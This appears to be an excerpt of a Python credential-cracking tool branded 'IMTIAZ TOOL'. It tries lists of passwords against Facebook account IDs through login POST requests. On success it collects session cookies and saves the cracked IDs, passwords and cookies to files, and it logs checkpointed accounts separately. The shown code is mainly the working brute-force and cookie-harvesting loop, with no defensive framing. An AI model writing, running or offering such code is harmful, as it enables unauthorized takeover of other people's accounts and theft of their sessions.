...
print('\n\033[0;97m[+]\033[1;32m WELLCOME TO IMTIAZ TOOL ðŸŒ·...')
os.system('espeak -a 300 " Wellcome,   To,  ,IMTIAZ ,Tool,"')
try:
...
def ffb3(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [IMTIAZ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' COOKIES: \033[1;32m'+cookies)
                                        open('/sdcard/IMTIAZ/IMTIAZ-M3-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/IMTIAZ/IMTIAZ-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [IMTIAZ-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/IMTIAZ/IMTIAZ-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
...
'Content-Length': '847'}
			...
			if 'session_key' in po:
				...
				open('/sdcard/IMTIAZ/IMTIAZ-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
				cp.append(uid)
				break
			else:
				continue
